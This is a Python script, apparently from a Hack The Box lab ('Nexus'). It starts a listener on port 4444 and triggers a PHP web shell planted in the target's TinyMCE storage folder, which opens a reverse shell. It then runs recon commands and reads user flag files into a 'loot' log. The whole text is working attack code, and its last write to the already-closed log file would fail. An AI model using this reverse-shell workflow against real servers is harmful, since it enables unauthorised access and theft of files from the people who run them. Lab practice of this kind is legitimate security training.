import socket, time, sys
HOST, PORT = "0.0.0.0", 4444
TRIGGER = "http://billing.nexus.htb/storage/tinymce/9ece6363b0d7b6c8dcc36ac1fb711df0.php"
OUT = "/home/kali/Desktop/htb/Nexus/loot/shell-cmds.txt"
cmds = [
    "id",
    "whoami",
    "hostname",
    "pwd",
    "ls -la /home",
    "ls -la /home/jones 2>/dev/null",
    "cat /home/jones/user.txt 2>/dev/null",
    "cat /home/git/user.txt 2>/dev/null",
    "find /home -name user.txt 2>/dev/null",
    "uname -a",
    "exit\n",
]
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.settimeout(90)
s.bind((HOST, PORT))
s.listen(1)
with open(OUT, "w") as f:
    f.write(f"[*] listening {PORT}\n"); f.flush()
    import subprocess
    subprocess.Popen(["curl", "-s", "--max-time", "10", TRIGGER])
    try:
        c, addr = s.accept()
    except Exception as e:
        f.write(f"[!] accept failed: {e}\n"); sys.exit(1)
    f.write(f"[+] connect from {addr}\n"); f.flush()
    c.settimeout(2)
    time.sleep(1)
    try:
        banner = c.recv(8192)
        if banner:
            f.write(banner.decode(errors="replace"))
    except Exception:
        pass
    for cmd in cmds:
        f.write(f"\n$ {cmd}\n"); f.flush()
        c.sendall((cmd + "\n").encode())
        time.sleep(0.8)
        chunks = []
        while True:
            try:
                d = c.recv(4096)
                if not d:
                    break
                chunks.append(d)
            except socket.timeout:
                break
        if chunks:
            f.write(b"".join(chunks).decode(errors="replace"))
        f.flush()
    c.close()
s.close()
f.write("\n[*] done\n")
